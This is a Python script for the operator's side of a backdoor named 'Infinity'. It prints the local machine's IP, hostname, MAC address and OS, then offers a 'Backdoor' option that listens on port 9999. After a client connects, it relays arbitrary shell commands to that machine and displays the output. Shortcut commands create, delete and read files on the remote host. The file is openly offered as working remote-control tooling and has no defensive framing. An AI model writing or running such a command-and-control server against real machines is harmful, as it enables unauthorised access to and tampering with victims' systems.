

import time
import os
import socket
import threading
import re, uuid, platform
import subprocess
from subprocess import check_output
import sys
from queue import Queue 

#creat socket
def socket_create():
	try:
		global comip
		global host
		global port
		global s
		host = (comip)
		port = (9999)
		s = socket.socket()

	except socket.error as msg:
		print ("Socket creation error: " + str(msg))

#bind to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print ("Bindding socket to port: " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("\nSocket bindding error: " + str(msg) + ("\nRetry..."))
		socket_bind()

#Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been esablished | " + "IP " + address[0] + " | Port " + str(address[1]) + ("\nEnter [list!] for Infinity commands"))

	send_commands(conn)
	conn.close()




def send_commands(conn):
	while True:
		try:
			cmd = input("|Infinity|-> ")
			if cmd == ("quit"):
				conn.send(str.encode(cmd))
				time.sleep(1)
				conn.close()
				s.close()
				main()

			elif (cmd) == ("list!"):
				print("___________________________________")
				print("              |List|               ")
				print("___________________________________")
				print("                                   ")
				print(" m!: Make text file                ")
				print("\n d!: Delete file                 ")
				print("\n r!: Read a file\n")
				send_commands(conn)



			elif (cmd) == ("m!"):
				make_txt_name = input("\nName of file: ")
				make_txt_content = input("\nContent: ")
				conn.send(str.encode(('echo ') + ("'") + (make_txt_content) + ("' >") + (make_txt_name) ))


			elif (cmd) == ("d!"):
				del_file_name = input("\nName of file: ")
				conn.send(str.encode(("del ") + (del_file_name)))

			elif (cmd) == ("r!"):
				read_file_name = input("Name of txt file: ")
				conn.send(str.encode(("more ") + (read_file_name)))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))



			elif len(str.encode(cmd)) > (0):
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

		except OSError:
			print("\nClient left session...")
			OsError_rec = input("\nEnter anything to go to start... ")

			if len(str(OsError_rec)) > (0):
				main()

			else:
				main()




def main():
	global comip
	#computer local ip
	comip = (check_output(['hostname', '--all-ip-addresses']))
	#computer name
	comhostname = (socket.gethostname())
	#computer mac
	commac = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
	#computer OS
	OS = (platform.system())
	 
	os.system("clear")
	print("                            ")
	print("      ^                     ")
	print("    ^   ^    info:          ")
	print("    ^   ^      IP: " + (comip.decode('utf-8')))
	print("    ^^  ^      Hostname: " + comhostname)
	print("      ^        Computer Mac: " + commac)
	print("    ^  ^^      Computer OS: " + OS)
	print("    ^   ^                   ")
	print("    ^   ^")
	print("     ^^^\n")
	print(" 1: Backdoor\n")


	awn = input("Pick a number (enter [quit] to quit): ")


	if awn == ("1"):
		os.system("clear")

		print("   _____________")
		print("  |\____________\ ")
		print("  | |           | ")
		print("  | | B         | ")
		print("  | |  A        | ")
		print("  | |   C       | ")
		print("  | |    K     O| ")
		print("  | |     D     | ")
		print("  | |      O    | ")
		print("  | |       O   | ")
		print("  \ |        R  |")
		print("   \|___________|\n")

		

		def backdoor_start():
			socket_create()
			socket_bind()
			socket_accept()

		backdoor_start()

	elif awn == ("quit"):
		sys.exit()




	else:
		main()


main()